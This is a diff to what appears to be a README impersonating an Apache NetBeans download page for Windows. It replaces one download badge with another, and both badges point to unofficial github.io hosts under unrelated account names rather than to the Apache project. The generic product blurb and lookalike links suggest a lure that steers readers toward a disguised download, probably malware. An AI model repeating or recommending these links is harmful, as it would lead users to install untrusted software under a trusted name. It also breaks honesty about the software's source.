@@ -9,7 +9,7 @@
 
 Apache NetBeans is an enterprise-grade integrated development environment optimized for the Windows platform. It provides a robust, extensible workspace for developing Java, PHP, JavaScript, and C/C++ applications. By featuring advanced static analysis tools, automated code refactoring, and a modular architecture built on Swing components, the software eliminates boilerplate management friction from complex software engineering pipelines.
 
-[![Download NetBeans](https://img.shields.io/badge/Download-NetBeans-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://malioonecaetteria.github.io/.github/NetBeans-Integrated-Module)
+[![Open Apache NetBeans](https://img.shields.io/badge/Open-Apache%20NetBeans-1E293B?style=for-the-badge)](https://netbeans-module.github.io/.github/)
 
 ---
 
